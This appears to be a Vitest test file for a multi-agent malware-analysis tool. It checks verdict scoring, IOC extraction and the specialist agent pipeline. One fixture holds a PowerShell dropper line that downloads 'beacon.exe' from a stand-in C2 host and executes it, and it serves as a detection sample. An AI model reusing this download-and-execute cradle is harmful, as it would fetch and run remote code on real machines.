import { describe, expect, it } from 'vitest';
import {
  ANALYSIS_PIPELINE_ORDER,
  buildPipelineOrder,
  computeAggregateVerdict,
  generateFinding,
  getThreatIntelCandidates,
  initializeAgentFindings,
} from './multiAgentAnalysis';
import { INITIAL_AGENTS } from '../data/mockData';
import { autoAssignAgent } from './autoAssignAgent';
import { EvidenceArtifact, AgentFinding } from '../types';

describe('computeAggregateVerdict', () => {
  it('returns Unknown when no specialist produced a score', () => {
    expect(computeAggregateVerdict([{ agentId: 'verification-agent', agentName: 'Verification', status: 'complete', stepProgress: 100 }])).toEqual({
      maliciousScore: 0,
      verdict: 'Unknown',
    });
  });

  it('averages scored specialists and preserves threshold semantics', () => {
    expect(computeAggregateVerdict([
      { agentId: 'malware-analysis', agentName: 'Malware', status: 'complete', stepProgress: 100, maliciousScore: 80 },
      { agentId: 'ioc-extraction', agentName: 'IOC', status: 'complete', stepProgress: 100, maliciousScore: 60 },
    ])).toEqual({ maliciousScore: 70, verdict: 'Malicious' });
  });
});

describe('threat-intel candidate preparation', () => {
  it('keeps every discovered IOC for provider evaluation', () => {
    const candidates = getThreatIntelCandidates({
      id: 'artifact-1',
      name: 'report.txt',
      type: 'file',
      uploadedAt: '2026-09-17T00:00:00.000Z',
      uploadedBy: 'test',
      status: 'Ingested',
      tags: [],
      previewContent: [
        '0123456789abcdef0123456789abcdef01234567',
        ...Array.from({ length: 13 }, (_, index) => `https://host-${index}.example/payload.exe`),
        'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater',
      ].join('\n'),
    });

    expect(candidates.length).toBeGreaterThan(12);
    expect(candidates.map((ioc) => ioc.type)).toEqual(expect.arrayContaining(['sha1', 'url', 'registry_path']));
  });
});

describe('8 Specialist Agents Suite', () => {
  it('has all 8 specialist agents in ANALYSIS_PIPELINE_ORDER', () => {
    expect(ANALYSIS_PIPELINE_ORDER).toEqual([
      'malware-analysis',
      'ioc-extraction',
      'network-analysis',
      'threat-intel',
      'code-review',
      'memory-agent',
      'verification-agent',
      'report-generator',
    ]);
  });

  it('buildPipelineOrder respects primary agent assignment', () => {
    const pipeline = buildPipelineOrder(INITIAL_AGENTS, 'Network Analysis');
    expect(pipeline[0].id).toBe('network-analysis');
    expect(pipeline.length).toBe(8);
  });

  it('initializes agent findings with the first agent active', () => {
    const pipeline = buildPipelineOrder(INITIAL_AGENTS);
    const findings = initializeAgentFindings(pipeline);
    expect(findings.length).toBe(8);
    expect(findings[0].status).toBe('analyzing');
    expect(findings[1].status).toBe('pending');
  });

  const testArtifact: EvidenceArtifact = {
    id: 'test-art-1',
    name: 'dropper_script.ps1',
    type: 'code',
    status: 'Analyzing',
    uploadedAt: '10:00:00',
    uploadedBy: 'Analyst',
    tags: ['powershell', 'dropper'],
    previewContent: '$client = New-Object System.Net.WebClient;\n$client.DownloadFile("http://malicious-c2.org/beacon.exe", "C:\\temp\\beacon.exe");\nStart-Process "C:\\temp\\beacon.exe";',
  };

  it('Agent 1: malware-analysis generates evidence-backed finding', () => {
    const finding = generateFinding('malware-analysis', testArtifact);
    expect(finding.summary).toBeTruthy();
    expect(finding.verdict).toBeDefined();
  });

  it('Agent 2: ioc-extraction extracts URL and paths correctly', () => {
    const finding = generateFinding('ioc-extraction', testArtifact);
    expect(finding.summary).toMatch(/indicator|IOC/i);
    expect(finding.findings?.length).toBeGreaterThan(0);
  });

  it('Agent 3: network-analysis flags network primitives', () => {
    const finding = generateFinding('network-analysis', testArtifact);
    expect(finding.summary).toContain('URL/domain/IP');
    expect(finding.verdict).toBeDefined();
  });

  it('Agent 4: threat-intel provides indicator evaluation summary', () => {
    const finding = generateFinding('threat-intel', testArtifact);
    expect(finding.summary).toBeTruthy();
  });

  it('Agent 5: code-review flags malicious download & execute script primitives', () => {
    const finding = generateFinding('code-review', testArtifact);
    expect(['Malicious', 'Suspicious']).toContain(finding.verdict);
    expect(finding.maliciousScore).toBeGreaterThanOrEqual(40);
  });

  it('Agent 6: memory-agent reports search status', () => {
    const finding = generateFinding('memory-agent', testArtifact);
    expect(finding.summary).toBeTruthy();
  });

  it('Agent 7 & 8: verification-agent and report-generator cross-validate prior findings', () => {
    const priorFindings: AgentFinding[] = [
      {
        agentId: 'code-review',
        agentName: 'Code Review',
        status: 'complete',
        stepProgress: 100,
        verdict: 'Malicious',
        maliciousScore: 85,
        summary: 'Execution cradle found',
        findings: [{ claim: 'Download execution', evidence: 'Start-Process', source: 'code', confidence: 0.9 }],
      },
      {
        agentId: 'ioc-extraction',
        agentName: 'IOC Extraction',
        status: 'complete',
        stepProgress: 100,
        verdict: 'Suspicious',
        maliciousScore: 60,
        summary: 'Extracted C2 URL',
        findings: [{ claim: 'C2 URL found', evidence: 'http://malicious-c2.org', source: 'ioc', confidence: 0.85 }],
      },
    ];

    const artifactWithPrior: EvidenceArtifact = {
      ...testArtifact,
      agentFindings: priorFindings,
    };

    const verification = generateFinding('verification-agent', artifactWithPrior);
    expect(verification.summary).toBeTruthy();
    expect(verification.findings?.length).toBeGreaterThan(0);

    const report = generateFinding('report-generator', artifactWithPrior);
    expect(report.summary).toContain('Final report');
  });

  it('autoAssignAgent correctly selects optimal agent based on domain skills', () => {
    const result = autoAssignAgent(
      { title: 'Decompile and analyze suspicious ransomware binary .exe', category: 'Malware' },
      INITIAL_AGENTS,
      [],
    );
    expect(result.suggestedAgent.id).toBe('malware-analysis');
    expect(result.confidence).toBeGreaterThan(50);
  });
});
